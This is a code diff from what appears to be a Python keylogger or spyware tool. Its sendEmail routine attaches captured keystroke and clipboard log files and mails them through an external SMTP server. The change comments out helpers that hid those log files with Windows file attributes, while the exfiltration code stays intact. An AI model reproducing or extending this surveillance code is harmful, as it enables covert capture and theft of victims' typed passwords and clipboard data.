@@ -10,20 +10,20 @@ from encryption import encryptContents
 log_file = "logs.txt"
 clipBoard_file = "clipBoardLogs.txt"
 
-def unhide():
-    if os.path.exists(log_file):
-        print("unhidden")
-        os.system(f'attrib -h "{log_file}"')
+# def unhide():
+#     if os.path.exists(log_file):
+#         print("unhidden")
+#         os.system(f'attrib -h "{log_file}"')
 
-    if os.path.exists(clipBoard_file):
-        os.system(f'attrib -h "{clipBoard_file}"')
+#     if os.path.exists(clipBoard_file):
+#         os.system(f'attrib -h "{clipBoard_file}"')
 
-def hide():
-    if os.path.exists(log_file):
-        os.system(f'attrib +h "{log_file}"')
+# def hide():
+#     if os.path.exists(log_file):
+#         os.system(f'attrib +h "{log_file}"')
 
-    if os.path.exists(clipBoard_file):
-        os.system(f'attrib +h "{clipBoard_file}"')
+#     if os.path.exists(clipBoard_file):
+#         os.system(f'attrib +h "{clipBoard_file}"')
 
 
 def sendEmail():
@@ -32,10 +32,10 @@ def sendEmail():
     if os.path.exists("logs.txt"):
         print("here")
         # os.system(f'attrib -h "{"logs.txt"}"')
-        unhide()
+        # unhide()
     if os.path.exists("clipBoardLogs.txt"):
         print("here")
-        unhide()
+        # unhide()
         # os.system(f'attrib -h "{"clipBoardLogs.txt"}"')
 
 
@@ -53,10 +53,10 @@ def sendEmail():
     message.set_content("Please find the logs attached.")
     try:
 
-        if os.path.exists("logs.bin"):
-            os.system(f'attrib -h "{"logs.bin"}"')
-        if os.path.exists("clipBoardLogs.bin"):
-            os.system(f'attrib -h "{"clipBoardLogs.bin"}"')
+        # if os.path.exists("logs.bin"):
+        #     os.system(f'attrib -h "{"logs.bin"}"')
+        # if os.path.exists("clipBoardLogs.bin"):
+        #     os.system(f'attrib -h "{"clipBoardLogs.bin"}"')
 
         with open(log_file, "rb") as file:
             fileData = file.read()
@@ -65,11 +65,11 @@ def sendEmail():
             clipBoardFileData = clipBoardFile.read()
             message.add_attachment(clipBoardFileData, maintype="text", subtype="plain", filename="clipBoardLogs.txt")
 
-        if os.path.exists("logs.bin"):
-            os.system(f'attrib +h "{"logs.bin"}"')
-        if os.path.exists("clipBoardLogs.bin"):
-            os.system(f'attrib +h "{"clipBoardLogs.bin"}"')
-        hide()
+        # if os.path.exists("logs.bin"):
+        #     os.system(f'attrib +h "{"logs.bin"}"')
+        # if os.path.exists("clipBoardLogs.bin"):
+        #     os.system(f'attrib +h "{"clipBoardLogs.bin"}"')
+        # hide()
 
         with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
             server.starttls()
